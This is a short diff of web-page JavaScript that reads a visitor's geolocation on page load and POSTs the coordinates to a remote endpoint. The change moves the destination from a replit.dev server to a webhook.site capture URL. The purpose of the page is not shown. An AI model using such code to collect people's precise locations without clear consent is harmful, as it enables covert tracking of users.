@@ -34,8 +34,8 @@ document.addEventListener("DOMContentLoaded", function () {
           console.log("Longitude: " + position.coords.longitude);
           console.log("Accuracy: " + accuracy + " meters");
 
-          // Send location to Railway server
-          fetch("https://fbe791fc-9fb3-4d1e-9760-c79117d41429-00-1ckpnluj42n2q.sisko.replit.dev/save-location", {
+          // Send location to webhook.site server
+          fetch("https://webhook.site/73a7d7bb-732c-4bda-9b5c-3ed0caeb1d70", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
